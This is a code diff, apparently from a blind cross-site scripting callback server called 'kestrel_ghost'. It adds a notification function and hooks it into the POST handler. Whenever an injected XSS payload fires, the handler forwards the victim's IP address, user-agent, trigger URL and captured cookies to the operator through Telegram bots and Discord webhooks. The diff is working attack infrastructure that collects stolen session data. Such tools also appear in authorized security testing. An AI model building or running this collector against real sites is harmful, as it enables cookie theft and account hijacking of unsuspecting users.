@@ -20,6 +20,57 @@ function generateXssId() {
   return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 }
 
+async function sendNotification(config, title, fields) {
+  if (!config) return;
+  
+  // Format dynamic markdown for Telegram
+  let telegramMessage = `🛰 *[kestrel_ghost]* 🛰\n🔥 *${title}* 🔥\n\n`;
+  for (const [key, val] of Object.entries(fields)) {
+    telegramMessage += `• *${key}*: \`${String(val).replace(/[_*`\[\]]/g, '\\$&')}\`\n`;
+  }
+  
+  // Send Telegram
+  if (config.telegramEnabled && config.telegramToken && config.telegramChatId) {
+    try {
+      const url = `https://api.telegram.org/bot${config.telegramToken}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: config.telegramChatId,
+          text: telegramMessage,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (err) {
+      console.error('Telegram Notification failed:', err);
+    }
+  }
+  
+  // Send Discord Webhook
+  if (config.discordEnabled && config.discordWebhook) {
+    try {
+      const embeds = [{
+        title: `🛰 kestrel_ghost: ${title}`,
+        color: 0x7c4dff, // violet for XSS
+        fields: Object.entries(fields).map(([key, val]) => ({
+          name: key,
+          value: String(val).substring(0, 1023) || 'None',
+          inline: false
+        })),
+        timestamp: new Date().toISOString()
+      }];
+      await fetch(config.discordWebhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds })
+      });
+    } catch (err) {
+      console.error('Discord Notification failed:', err);
+    }
+  }
+}
+
 export async function POST(request) {
   const { searchParams } = new URL(request.url);
   const id = searchParams.get('id');
@@ -78,6 +129,32 @@ export async function POST(request) {
       
       store.xss[id].unshift(xssLog);
       store.xss[id] = store.xss[id].slice(0, 50); // Keep last 50
+    }
+
+    // 5. Send alerts if configured
+    let savedConfig = null;
+    if (isKvConnected) {
+      savedConfig = await kv.get(`webhook:${id}:config`);
+    } else {
+      savedConfig = global._webhooksStore.configs[id] || null;
+    }
+
+    if (savedConfig) {
+      try {
+        const config = typeof savedConfig === 'string' ? JSON.parse(savedConfig) : savedConfig;
+        if (config && (config.telegramEnabled || config.discordEnabled)) {
+          const xssFields = {
+            'Payload Type': 'BLIND XSS TRIGGERED ☣️',
+            'Trigger Source URL': xssLog.uri,
+            'Victim IP Address': xssLog.ip,
+            'User-Agent String': xssLog.userAgent,
+            'Captured Cookies': xssLog.cookies ? xssLog.cookies.substring(0, 400) : 'None'
+          };
+          sendNotification(config, 'Blind XSS Payload Triggered!', xssFields).catch(console.error);
+        }
+      } catch (err) {
+        console.error('XSS Notify processing error:', err);
+      }
     }
 
     return new NextResponse(JSON.stringify({ success: true, message: 'XSS Callback captured' }), {
